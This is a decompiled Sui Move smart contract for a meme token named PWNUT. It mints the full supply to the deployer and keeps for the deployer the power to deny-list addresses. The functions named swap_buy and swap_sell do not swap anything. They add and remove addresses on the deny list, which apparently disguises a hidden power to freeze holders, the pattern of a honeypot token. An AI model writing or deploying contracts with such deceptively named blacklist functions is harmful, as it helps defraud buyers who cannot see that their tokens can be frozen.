module 0xe9adb19ed53e3beece7e1f7dddd4cab773cec5b2bd48c35318bee2b91e60b107::pwnut {
    struct PWNUT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PWNUT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PWNUT>(arg0, 9, b"PWNUT", b"Pweanut", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmPyxnYqVYZ6LWa7BBQAszQBGp1DZkeRLYydLRsxSCSYG8"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PWNUT>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PWNUT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PWNUT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PWNUT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PWNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PWNUT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PWNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PWNUT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

